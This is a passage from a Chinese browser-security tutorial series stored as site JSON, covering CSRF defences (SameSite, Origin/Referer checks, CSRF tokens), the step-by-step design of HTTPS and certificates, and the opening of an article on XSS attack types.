请求时，有如下区别：</p>\n<ul>\n<li>如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服务器；</li>\n<li>如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送。<br>而我们要聊的 Cookie 中的 SameSite 属性正是为了解决这个问题的，通过使用 SameSite 可以有效地降低 CSRF 攻击的风险。</li>\n</ul>\n<p>那 SameSite 是怎么防止 CSRF 攻击的呢？</p>\n<p>在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项，如下：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">set-cookie: 1P_JAR=2019-10-20-06; expires=Tue, 19-Nov-2019 06:36:21 GMT; path=/; domain=.google.com; SameSite=none</span><br></pre></td></tr></tbody></table></figure>\n\n<p>SameSite 选项通常有 Strict、Lax 和 None 三个值。</p>\n<ul>\n<li><strong>Strict 最为严格</strong>。如果 SameSite 的值是 Strict，那么浏览器会完全禁止第三方 Cookie。简言之，如果你从极客时间的页面中访问 InfoQ 的资源，而 InfoQ 的某些 Cookie 设置了 SameSite = Strict 的话，那么这些 Cookie 是不会被发送到 InfoQ 的服务器上的。只有你从 InfoQ 的站点去请求 InfoQ 的资源时，才会带上这些 Cookie。</li>\n<li><strong>Lax 相对宽松一点</strong>。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法，或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。</li>\n<li>而如果<strong>使用 None</strong> 的话，在任何情况下都会发送 Cookie 数据。<br>关于 SameSite 的具体使用方式，你可以参考这个<span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuZGV2L3NhbWVzaXRlLWNvb2tpZXMtZXhwbGFpbmVk\">链接<i class=\"fa fa-external-link-alt\"></i></span>。</li>\n</ul>\n<p>对于防范 CSRF 攻击，我们可以针对实际情况将一些关键的 Cookie 设置为 Strict 或者 Lax 模式，这样在跨站点请求时，这些关键的 Cookie 就不会被发送到服务器，从而使得黑客的 CSRF 攻击失效。</p>\n<h3 id=\"验证请求的来源站点\"><a href=\"#验证请求的来源站点\" class=\"headerlink\" title=\"验证请求的来源站点\"></a>验证请求的来源站点</h3><p>接着我们再来了解另外一种防止 CSRF 攻击的策略，那就是<strong>在服务器端验证请求来源的站点</strong>。由于 CSRF 攻击大多来自于第三方站点，因此服务器可以禁止来自第三方站点的请求。那么该怎么判断请求是否来自第三方站点呢？</p>\n<p>这就需要介绍 HTTP 请求头中的 Referer 和 Origin 属性了。</p>\n<p><strong>Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址</strong>。比如我从极客时间的官网打开了 InfoQ 的站点，那么请求头中的 Referer 值是极客时间的 URL，如下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663ee25b0ea9cb140360b8df.png\" alt=\"HTTP请求头中的Referer引用\"></p>\n<p>虽然可以通过 Referer 告诉服务器 HTTP 请求的来源，但是有一些场景是不适合将来源 URL 暴露给服务器的，因此浏览器提供给开发者一个选项，可以不用上传 Referer 值，具体可参考 <strong>Referrer Policy</strong>。</p>\n<p>但在服务器端验证请求头中的 Referer 并不是太可靠，因此标准委员会又制定了 <strong>Origin 属性</strong>，在一些重要的场合，比如通过 XMLHttpRequest、Fecth 发起跨站请求或者通过 Post 方法发送请求时，都会带上 Origin 属性，如下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663ee28d0ea9cb1403612cdd.png\" alt=\"Post请求时的Origin信息\"></p>\n<p>从上图可以看出，Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin 和 Referer 的一个主要区别。在这里需要补充一点，Origin 的值之所以不包含详细路径信息，是有些站点因为安全考虑，不想把源站点的详细路径暴露给服务器。</p>\n<p>因此，服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际情况判断是否使用 Referer 值。</p>\n<h3 id=\"CSRF-Token\"><a href=\"#CSRF-Token\" class=\"headerlink\" title=\"CSRF Token\"></a>CSRF Token</h3><p>除了使用以上两种方式来防止 CSRF 攻击之外，还可以采用 CSRF Token 来验证，这个流程比较好理解，大致分为两步。</p>\n<p><strong>第一步</strong>，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。你可以参考下面示例代码：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"https://time.geekbang.org/sendcoin\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"csrf-token\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"nc98P987bcpncYhoadjoiydc9ajDlcn\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"user\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"number\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>第二步</strong>，在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天我们就介绍到这里，下面我来总结下本文的主要内容。</p>\n<p>我们结合一个实际案例介绍了 CSRF 攻击，要<strong>发起 CSRF 攻击需要具备三个条件</strong>：目标站点存在漏洞、用户要登录过目标站点和黑客需要通过第三方站点发起攻击。</p>\n<p>根据这三个必要条件，我们又介绍了该<strong>如何防止 CSRF 攻击</strong>，具体来讲主要有三种方式：充分利用好 Cookie 的 SameSite 属性、验证请求的来源站点和使用 CSRF Token。这三种方式需要合理搭配使用，这样才可以有效地防止 CSRF 攻击。</p>\n<p>再结合前面两篇文章，我们可以得出页面安全问题的主要原因就是<strong>浏览器为同源策略开的两个 “后门”</strong>：一个是在页面中可以任意引用第三方资源，另外一个是通过 CORS 策略让 XMLHttpRequest 和 Fetch 去跨域请求资源。</p>\n<p>为了解决这些问题，我们引入了 CSP 来限制页面任意引入外部资源，引入了 HttpOnly 机制来禁止 XMLHttpRequest 或者 Fetch 发送一些关键 Cookie，引入了 SameSite 和 Origin 来防止 CSRF 攻击。</p>\n<p>通过这三篇文章的分析，相信你应该已经能搭建 Web 页面安全的知识体系网络了。有了这张网络，你就可以将 HTTP 请求头和响应头中各种安全相关的字段关联起来，比如 Cookie 中的一些字段，还有 X-Frame-Options、X-Content-Type-Options、X-XSS-Protection 等字段，也可以将 CSP、CORS 这些知识点关联起来。当然这些并不是浏览器安全的全部，后面两篇文章我们还会介绍浏览器系统安全和浏览器网络安全两大块的内容，这对于你学习浏览器安全来说也是至关重要的。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>什么是 CSRF 攻击？在开发项目过程中应该如何防御 CSRF 攻击？</p>\n<p>CSRF（Cross-Site Request Forgeries） 攻击指的是跨站请求伪造攻击，攻击者诱导用户进入一个第三方网站，然后该网站向被攻击网站发送跨站请求。如果用户在被攻击网站中保存了登录状态，那么攻击者就可以利用这个登录状态，绕过后台的用户验证，冒充用户向服务器执行一些操作。</p>\n<p>如何防御 CSRF 攻击，总共有三个方法：</p>\n<ol>\n<li>充分利用好 Cookie 的 SameSite 属性</li>\n<li>进行同源检测，服务器根据 http 请求头中 origin 或者 referer 信息来判断请求是否为允许访问的站点，从而对请求进行过滤。</li>\n<li>CSRF Token 验证。</li>\n</ol>\n"},{"title":"HTTPS：让数据传输更安全","url":"/browser/security/HTTPS.html","content":"<p>浏览器安全主要划分为三大块内容：<strong>页面安全</strong>、<strong>系统安全</strong>和<strong>网络安全</strong>。前面我们用四篇文章介绍了页面安全和系统安全，也聊了浏览器和 Web 开发者是如何应对各种类型的攻击，本文是我们专栏的最后一篇，我们就接着来聊聊网络安全协议 HTTPS。</p>\n<p>我们先从 HTTP 的明文传输的特性讲起，在上一个模块的三篇文章中我们分析过，起初设计 HTTP 协议的目的很单纯，就是为了<strong>传输超文本文件</strong>，那时候也没有太强的加密传输的数据需求，所以 HTTP 一直保持着<strong>明文传输数据</strong>的特征。但这样的话，在传输过程中的每一个环节，数据都有可能被窃取或者篡改，这也意味着你和服务器之间还可能有个中间人，你们在通信过程中的一切内容都在中间人的掌握中，如下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664215af0ea9cb1403366f39.png\" alt=\"中间人攻击\"></p>\n<p>从上图可以看出，我们使用 HTTP 传输的内容很容易被中间人窃取、伪造和篡改，通常我们把这种攻击方式称为<strong>中间人攻击</strong>。</p>\n<p>具体来讲，在将 HTTP 数据提交给 TCP 层之后，数据会经过用户电脑、WiFi 路由器、运营商和目标服务器，在这中间的每一个环节中，数据都有可能被篡改或窃取。比如用户电脑被黑客安装了恶意软件，那么我们提交的 HTTP 数据也会被恶意软件窃取。或者用户一不小心连接了 WiFi 钓鱼路由器，那么数据也会被窃取。</p>\n<h2 id=\"在HTTP协议栈中引入安全层\"><a href=\"#在HTTP协议栈中引入安全层\" class=\"headerlink\" title=\"在HTTP协议栈中引入安全层\"></a>在 HTTP 协议栈中引入安全层</h2><p>鉴于 HTTP 的明文传输使得传输过程毫无安全性可言，且制约了网上购物、在线转账等一系列场景应用，于是倒逼着我们要引入<strong>加密方案</strong>。</p>\n<p>从 HTTP 协议栈层面来看，我们可以在 TCP 和 HTTP 之间插入一个安全层，所有经过安全层的数据都会被加密或者解密，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664217080ea9cb140338336b.png\" alt=\"HTTP VS HTTPS\"></p>\n<p>我们可以从图中看出，HTTP 并非是一个新的协议，通常 HTTP 直接和 TCP 通讯，HTTPS 则先和安全层通信，然后安全层和 TCP 层通信。也就是说 HTTPS 的所有安全核心都在安全层，他不会影响到上面的 HTTP 协议。也不会影响到 TCP/IP 协议，因此要搞清楚 HTTPS 是如何工作的，就要弄清楚安全层是如何工作的。</p>\n<p>总的来说，安全层有两个主要的职责： <strong>对发起 HTTP 请求的数据进行加密操作</strong> 和 <strong>对接收到 HTTP 的响应内容进行解密操作</strong>。</p>\n<p>我们知道了安全层最重要的就是加解密，那么接下来我们就利用这个安全层，一步一步实现一个从简单到复杂的 HTTPS 协议。</p>\n<h2 id=\"第一版：使用对称加密\"><a href=\"#第一版：使用对称加密\" class=\"headerlink\" title=\"第一版：使用对称加密\"></a>第一版：使用对称加密</h2><p>提到加密，最简单的方式是使用对称加密。所谓对称加密是指加密和解密都使用的是相同的密钥。</p>\n<p>了解了对称加密，下面我们就使用对称加密来实现第一版的 HTTPS。</p>\n<p>要在两台电脑上加解密同一个文件，我们至少需要知道加解密方式和密钥，因此，在 HTTPS 发送数据之前，浏览器和服务器之间需要协商加密方式和密钥，过程如下所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664218dc0ea9cb14033aa244.png\" alt=\"使用对称加密实现HTTPS\"></p>\n<p>通过上图我们可以看出，HTTPS 首先要协商加解密方式，这个过程就是 HTTPS 建立安全连接的过程。为了让加密的密钥更加难以破解，我们让服务器和客户端同时决定密钥，具体过程如下：</p>\n<ul>\n<li>浏览器发送他所支持的加密套件和一个随机数 ClientRandom，这里的加密套件指的是加密的方法，加密套件列表就是指浏览器能支持多少种加密方法列表。</li>\n<li>服务器收到浏览器发来的数据后，选择一个加密套件，并将 ClientRandom 和 ServerRandom 一起发送给浏览器。</li>\n<li>最后浏览器和服务器分别返回确认消息。</li>\n</ul>\n<p>这样浏览器端和服务器端都有相同的 client-random 和 service-random 了，然后它们再使用相同的方法将 client-random 和 service-random 混合起来生成一个密钥 master secret，有了密钥 master secret 和加密套件之后，双方就可以进行数据的加密传输了。</p>\n<p>通过将对称加密应用在安全层上，我们实现了第一个版本的 HTTPS，虽然这个版本能够很好地工作，但是其中传输 client-random 和 service-random 的过程却是明文的，这意味着黑客也可以拿到协商的加密套件和双方的随机数，由于利用随机数合成密钥的算法是公开的，所以黑客拿到随机数之后，也可以合成密钥，这样数据依然可以被破解，那么黑客也就可以使用密钥来伪造或篡改数据了。</p>\n<h2 id=\"第二版：使用非对称加密\"><a href=\"#第二版：使用非对称加密\" class=\"headerlink\" title=\"第二版：使用非对称加密\"></a>第二版：使用非对称加密</h2><p>不过非对称加密能够解决这个问题，因此接下来我们就利用非对称加密来实现我们第二版的 HTTPS，不过在讨论具体的实现之前，我们先看看什么是非对称加密。</p>\n<p>和对称加密只有一个密钥不同，<strong>非对称加密算法有 A、B 两把密钥，如果你用 A 密钥来加密，那么只能使用 B 密钥来解密；反过来，如果你要 B 密钥来加密，那么只能用 A 密钥来解密</strong>。</p>\n<p>在 HTTPS 中，服务器会将其中的一个密钥通过明文的形式发送给浏览器，我们把这个密钥称为<strong>公钥</strong>，服务器自己留下的那个密钥称为<strong>私钥</strong>。顾名思义，<strong>公钥是每个人都能获取到的，而私钥只有服务器才能知道，不对任何人公开</strong>。下图是使用非对称加密改造的 HTTPS 协议：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664219f40ea9cb14033bface.png\" alt=\"非对称加密实现HTTPS\"></p>\n<p>根据该图，我们来分析下使用非对称加密的请求流程。</p>\n<ul>\n<li><ul>\n<li>首先浏览器还是发送加密套件列表给服务器。</li>\n</ul>\n</li>\n<li><ul>\n<li>然后服务器会选择一个<strong>加密套件</strong>，不过和<strong>对称加密不同</strong>的是，使用非对称加密时服务器上需要<strong>有用于浏览器加密的公钥和服务器解密 HTTP 数据的私钥</strong>，由于<strong>公钥是给浏览器</strong>加密使用的，因此服务器会将<strong>加密套件和公钥</strong>一道发送给浏览器。</li>\n</ul>\n</li>\n<li><ul>\n<li>最后就是浏览器和服务器返回确认消息。</li>\n</ul>\n</li>\n</ul>\n<p>这样浏览器端就有了服务器的公钥，在浏览器端向服务器端发送数据时，就可以使用该公钥来加密数据。由于公钥加密的数据只有私钥才能解密，所以即便黑客截获了数据和公钥，他也是无法使用公钥来解密数据的。</p>\n<p>因此采用非对称加密，就能保证浏览器发送给服务器的数据是安全的了，这看上去似乎很完美，不过这种方式依然存在两个严重的问题。</p>\n<ul>\n<li><strong>第一个是非对称加密的效率太低</strong>。这会严重影响到加解密数据的速度，进而影响到用户打开页面的速度。</li>\n<li><strong>第二个是无法保证服务器发送给浏览器的数据安全</strong>。虽然浏览器端可以使用公钥来加密，但是服务器端只能采用私钥来加密，私钥加密只有公钥能解密，但黑客也是可以获取得到公钥的，这样就不能保证服务器端数据的安全了。</li>\n</ul>\n<h2 id=\"第三版：对称加密和非对称加密搭配使用\"><a href=\"#第三版：对称加密和非对称加密搭配使用\" class=\"headerlink\" title=\"第三版：对称加密和非对称加密搭配使用\"></a>第三版：对称加密和非对称加密搭配使用</h2><p>基于以上两点原因，我们最终选择了一个更加完美的方案，那就是<strong>在传输数据阶段依然使用对称加密，但是对称加密的秘钥我们采用非对称加密来传输</strong>。下图就是改造后的版本：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66421b490ea9cb14033dc740.png\" alt=\"混合加密实现HTTPS\"></p>\n<p>从图中可以看出，改造后的流程是这样的：</p>\n<ul>\n<li>首先浏览器需要发送对称加密套件列表、非对称加密套件列表和 client-random 给服务器。</li>\n<li>服务器保存 client-random，选择对称加密和非对称加密的套件，然后生成随机数 service-random，向浏览器发送选择的加密套件、service-random 和公钥；</li>\n<li>浏览器保存公钥，并生成随机数 pre-master，然后利用公钥对 pre-master 加密，发送给服务器。</li>\n<li>最后服务器拿出自己的私钥，解密出 pre-master 数据，并返回确认消息。<br>到此为止，服务器和浏览器就有了共同的 client-random、service-random 和 pre-master，然后服务器和浏览器会使用这三组随机数生成<strong>对称密钥</strong>，因为服务器和浏览器使用同一套方法来生成密钥，所以最终生成的密钥也是相同的。</li>\n</ul>\n<p>有了对称加密的密钥之后，双方就可以使用对称加密的方式来传输数据了。</p>\n<p>需要特别注意的一点，<strong>pre-master 是经过公钥加密之后传输的，所以黑客无法获取到 pre-master，就这样黑客就无法生成密钥，也就保证了黑客无法破解传输过程中的数据了</strong>。</p>\n<h2 id=\"第四版：添加数字证书\"><a href=\"#第四版：添加数字证书\" class=\"headerlink\" title=\"第四版：添加数字证书\"></a>第四版：添加数字证书</h2><p>通过对称和非对称混合方式，我们完美地实现了数据的加密传输。不过这种方式依然存在着问题，比如我要打开极客时间的官网 ，但是黑客通过 DNS 劫持将极客时间官网的 IP 地址替换成了黑客的 IP 地址，这样我访问的其实是黑客的服务器了，黑客就可以在自己的服务器上实现公钥和私钥，而对于浏览器来说，他完全不知道现在在访问的是个黑客的站点。</p>\n<p>所以我们还需要服务器向浏览器提供证明 “我就是我”，那怎么证明呢？</p>\n<p>这里我们结合实际生活中的一个例子，比如你要买房子，首先你需要给房管局提交你买房的材料，包括银行流水、银行证明、身份证等，然后房管局工作人员在验证无误后，会发给你一本盖了章的房产证，房产证上包含了你的名字、身份证号、房产地址、实际面积、公摊面积等信息。</p>\n<p>在这个例子中，你之所以能证明房子是你自己的，是因为引进了房管局这个<strong>权威机构</strong>，并通过这个权威机构给你颁发一个<strong>证书</strong>：房产证。</p>\n<p>同理，极客时间要证明这个服务器就是极客时间的，也需要使用权威机构颁发的证书，这个权威机构称为 <strong>CA（Certificate Authority）</strong>，颁发的证书就称为 ** 数字证书（Digital Certificate)**。</p>\n<p>对于浏览器来说，数字证书有两个作用：一个是<strong>通过数字证书向浏览器证明服务器的身份</strong>，另一个是<strong>数字证书里面包含了服务器公钥</strong>。</p>\n<p>接下来我们看看含有数字证书的 HTTPS 的请求流程，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664221ba0ea9cb140349abb7.png\" alt=\"完整的HTTPS请求流程\"></p>\n<p>相较于第三版的 HTTPS 协议，这里主要有两点改变：</p>\n<ol>\n<li>服务器没有直接返回公钥给浏览器，而是返回了数字证书，而公钥是包含在数字证书中的；</li>\n<li>在浏览器端多了一个证书验证的操作，验证了证书之后，才继续后续流程。</li>\n</ol>\n<p>通过引入数字证书，我们就实现了服务器的身份认证功能，这样即便黑客伪造了服务器，但是由于证书是没有办法伪造的，所以依然无法欺骗用户。</p>\n<h2 id=\"数字证书的申请和验证\"><a href=\"#数字证书的申请和验证\" class=\"headerlink\" title=\"数字证书的申请和验证\"></a>数字证书的申请和验证</h2><p>通过上面四个版本的迭代，我们实现了目前的 HTTPS 架构。</p>\n<p>在第四版的 HTTPS 中，我们提到过，有了数字证书，黑客就无法欺骗用户了，不过我们并没有解释清楚如何通过数字证书来证明用户身份，所以接下来我们再来把这个问题解释清楚。</p>\n<h2 id=\"如何申请数字证书\"><a href=\"#如何申请数字证书\" class=\"headerlink\" title=\"如何申请数字证书\"></a>如何申请数字证书</h2><p>我们先来看看如何向 CA 申请证书。比如极客时间需要向某个 CA 去申请数字证书，通常的申请流程分以下几步：</p>\n<ul>\n<li>首先极客时间需要准备一套私钥和公钥，私钥留着自己使用；</li>\n<li>然后极客时间向 CA 机构提交公钥、公司、站点等信息并等待认证，这个认证过程可能是收费的；</li>\n<li>CA 通过线上、线下等多种渠道来验证极客时间所提供信息的真实性，如公司是否存在、企业是否合法、域名是否归属该企业等；</li>\n<li>如信息审核通过，CA 会向极客时间签发认证的数字证书，包含了极客时间的公钥、组织信息、CA 的信息、有效时间、证书序列号等，这些信息都是明文的，同时包含一个 CA 生成的签名。<br>这样我们就完成了极客时间数字证书的申请过程。前面几步都很好理解，不过最后一步数字签名的过程还需要解释下：首先 CA 使用 <strong>Hash 函数</strong>来计算极客时间提交的明文信息，并得出<strong>信息摘要</strong>；然后 CA 再使用它的私钥对信息摘要进行加密，<strong>加密后的密文就是 CA 颁给极客时间的数字签名</strong>。这就相当于房管局在房产证上盖的章，这个章是可以去验证的，同样我们也可以通过数字签名来验证是否是该 CA 颁发的。</li>\n</ul>\n<h2 id=\"浏览器如何验证数字证书\"><a href=\"#浏览器如何验证数字证书\" class=\"headerlink\" title=\"浏览器如何验证数字证书\"></a>浏览器如何验证数字证书</h2><p>有了 CA 签名过的数字证书，当浏览器向极客时间服务器发出请求时，服务器会返回数字证书给浏览器。</p>\n<p>浏览器接收到数字证书之后，会对数字证书进行验证。首先浏览器读取证书中相关的明文信息，采用 CA 签名时相同的 Hash 函数来计算并得到<strong>信息摘要 A</strong>；然后再利用对应 CA 的公钥解密签名数据，得到<strong>信息摘要 B</strong>；对比信息摘要 A 和信息摘要 B，如果一致，则可以确认证书是合法的，即证明了这个服务器是极客时间的；同时浏览器还会验证证书相关的域名信息、有效时间等信息。</p>\n<p>这时候相当于验证了 CA 是谁，但是这个 CA 可能比较小众，浏览器不知道该不该信任它，然后浏览器会继续查找给这个 CA 颁发证书的 CA，再以同样的方式验证它上级 CA 的可靠性。通常情况下，操作系统中会内置信任的顶级 CA 的证书信息（包含公钥），如果这个 CA 链中没有找到浏览器内置的顶级的 CA，证书也会被判定非法。</p>\n<p>另外，在申请和使用证书的过程中，还需要注意以下三点：</p>\n<ol>\n<li>申请数字证书是不需要提供私钥的，要确保私钥永远只能由服务器掌握；</li>\n<li>数字证书最核心的是 CA 使用它的私钥生成的数字签名；</li>\n<li>内置 CA 对应的证书称为根证书，根证书是最权威的机构，它们自己为自己签名，我们把这称为自签名证书。</li>\n</ol>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p>\n<p>由于 HTTP 的明文传输特性，在传输过程中的每一个环节，数据都有可能被窃取或者篡改，这倒逼着我们需要引入加密机制。于是我们在 HTTP 协议栈的 TCP 和 HTTP 层之间插入了一个安全层，负责数据的加密和解密操作。</p>\n<p>我们使用对称加密实现了安全层，但是由于对称加密的密钥需要明文传输，所以我们又将对称加密改造成了非对称加密。但是非对称加密效率低且不能加密服务器到浏览器端的数据，于是我们又继续改在安全层，采用对称加密的方式加密传输数据和非对称加密的方式来传输密钥，这样我们就解决传输效率和两端数据安全传输的问题。</p>\n<p>采用这种方式虽然能保证数据的安全传输，但是依然没办法证明服务器是可靠的，于是又引入了数字证书，数字证书是由 CA 签名过的，所以浏览器能够验证该证书的可靠性。</p>\n<p>另外百看不如一试，我建议你自己亲手搭建一个 HTTPS 的站点，可以去 freeSSL 申请免费证书。链接我已经放在文中了：</p>\n<p>● <span class=\"exturl\" data-url=\"aHR0cHM6Ly9mcmVlc3NsLmNuLw==\">中文<i class=\"fa fa-external-link-alt\"></i></span><br>● <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZXNzbC5jb20v\">英文<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>今天留给你的作业：结合前面的文章以及本文，你来总结一下 HTTPS 的握手过程。</p>\n"},{"title":"跨站脚本攻击（XSS）：为什么 Cookie 中有 HttpOnly 属性？","url":"/browser/security/CrossSiteScripting.html","content":"<p>通过上篇文章的介绍，我们知道了同源策略可以隔离各个站点之间的 DOM 交互、页面数据和网络通信，虽然严格的同源策略会带来更多的安全，但是也束缚了 Web。这就需要在安全和自由之间找到一个平衡点，所以我们默认页面中可以引用任意第三方资源，然后又引入 CSP 策略来加以限制；默认 XMLHttpRequest 和 Fetch 不能跨站请求资源，然后又通过 CORS 策略来支持其跨域。</p>\n<p>不过支持页面中的第三方资源引用和 CORS 也带来了很多安全问题，其中最典型的就是 XSS 攻击。</p>\n<h2 id=\"什么是XSS攻击\"><a href=\"#什么是XSS攻击\" class=\"headerlink\" title=\"什么是XSS攻击\"></a>什么是 XSS 攻击</h2><p>XSS 全称是 Cross Site Scripting，为了与 “CSS” 区分开来，故简称 XSS，翻译过来就是 “跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。</p>\n<p>最开始的时候，这种攻击是通过跨域来实现的，所以叫 “跨域脚本”。但是发展到现在，往 HTML 文件中注入恶意代码的方式越来越多了，所以是否跨域注入脚本已经不是唯一的注入手段了，但是 XSS 这个名字却一直保留至今。</p>\n<p>当页面被注入了恶意 JavaScript 脚本时，浏览器无法区分这些脚本是被恶意注入的还是正常的页面内容，所以恶意注入 JavaScript 脚本也拥有所有的脚本权限。下面我们就来看看，如果页面被注入了恶意 JavaScript 脚本，恶意脚本都能做哪些事情。</p>\n<ul>\n<li>可以<strong>窃取 Cookie 信息</strong>。恶意 JavaScript 可以通过 “document.cookie” 获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。</li>\n<li>可以<strong>监听用户行为</strong>。恶意 JavaScript 可以使用 “addEventListener” 接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。</li>\n<li>可以通过<strong>修改 DOM</strong> 伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。</li>\n<li>还可以在<strong>页面内生成浮窗广告</strong>，这些广告会严重地影响用户体验。</li>\n</ul>\n<p>除了以上几种情况外，恶意脚本还能做很多其他的事情，这里就不一一介绍了。总之，如果让页面插入了恶意脚本，那么就相当于把我们页面的隐私数据和行为完全暴露给黑客了。</p>\n<h2 id=\"恶意脚本是怎么注入的\"><a href=\"#恶意脚本是怎么注入的\" class=\"headerlink\" title=\"恶意脚本是怎么注入的\"></a>恶意脚本是怎么注入的</h2><p>现在我们知道了页面中被注入恶意的 JavaScript 脚本是一件非常危险的事情，所以网站开发者会尽可能地避免页面中被注入恶意脚本。要想避免站点被注入恶意脚本，就要知道有哪些常见的注入方式。通常情况下，主要有<strong>存储型 XSS 攻击</strong>、<strong>反射型 XSS 攻击</strong>和<strong>基于 DOM 的 XSS 攻击</strong>三种方式来注入恶意脚本。</p>\n<h3 id=\"1-存储型XSS攻击\"><a href=\"#1-存储型XSS攻击\" class=\"headerlink\" title=\"1. 存储型XSS攻击\"></a>1. 存储型 XSS 攻击</h3><p>我们先来看看存储型 XSS 攻击是怎么向 HTML 文件中注入恶意脚本的，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663e26270ea9cb14033a0243.png\" alt=\"存储型XSS攻击\"></p>\n<p>通过上图，我们可以看出存储型 XSS 攻击大致需要经过下面几个步骤：</p>\n<ol>\n<li>首先黑客利用网站漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；</li>\n<li>然后用户向网站请求包含了恶意 JavaScript 代码的页面；</li>\n<li>当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息发送给恶意服务器。</li>\n</ol>\n<p>下面我们来看个例子，2015 年喜马拉雅就被曝出了存储型 XSS 漏洞。起因是在用户设置专辑名称时，服务器对关键字过滤不严格，比如可以将专辑名称设置为一段 JavaScript，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663e27720ea9cb14033ccc6e.png\" alt=\"喜马拉雅存储型XSS漏洞\"></p>\n<p>当黑客将专辑名称设置为一段 JavaScript 代码并提交时，喜马拉雅的服务器会保存该段 JavaScript 代码到数据库中。然后当用户打开黑客设置的专辑时，这段代码就会在用户的页面里执行（如下图），这样就可以获取用户的 Cookie 等数据信息。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663e27a40ea9cb14033d364e.png\" alt=\"用户打开了含有恶意脚本的页面\"></p>\n<p>当用户打开黑客设置的专辑页面时，服务器也会将这段恶意 JavaScript 代码返回给用户，因此这段恶意脚本就在用户的页面中执行了。</p>\n<p>恶意脚本可以通过 XMLHttpRequest 或者 Fetch 将用户的 Cookie 数据上传到黑客的服务器，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663e27d40ea9cb14033d9977.png\" alt=\"将Cookie等数据上传到黑客服务器\"></p>\n<p>黑客拿到了用户 Cookie 信息之后，就可以利用 Cookie 信息在其他机器上登录该用户的账号（如下图），并利用用户账号进行一些恶意操作。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663e28070ea9cb14033dfc6f.png\" 